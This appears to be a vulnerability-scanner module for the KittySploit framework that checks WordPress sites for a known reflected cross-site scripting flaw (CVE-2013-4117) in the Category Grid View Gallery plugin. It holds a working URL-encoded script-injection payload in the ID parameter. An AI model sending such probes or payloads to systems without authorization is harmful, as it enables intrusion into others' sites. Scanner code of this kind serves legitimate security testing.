#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A cross-site scripting vulnerability in includes/CatGridPost."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Plugin Category Grid View Gallery 2.3.1 - Cross-Site Scripting Detection',
        'description': 'A cross-site scripting vulnerability in includes/CatGridPost.php in the Category Grid View Gallery plugin 2.3.1 for WordPress allows remote attackers to inject arbitrary web script or HTML via the ID parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2013', 'cve', 'seclists', 'packetstorm', 'wordpress', 'xss', 'wp-plugin', 'anshul_sharma', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2013-4117',
            'http://openwall.com/lists/oss-security/2013/07/11/11',
            'http://seclists.org/bugtraq/2013/Jul/17',
            'http://exploit.iedb.ir/exploits-177.html',
            'http://packetstormsecurity.com/files/122259/WordPress-Category-Grid-View-Gallery-XSS.html',
        ],
        'cve': 'CVE-2013-4117',
    }

    def run(self):
        path = '/wp-content/plugins/category-grid-view-gallery/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Category Grid View Gallery =',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/wp-content/plugins/category-grid-view-gallery/includes/CatGridPost.php?ID=1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('</script><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WordPress Plugin Category Grid View Gallery 2.3.1 - Cross-Site Scripting detected', path=path)
            return True
        return False

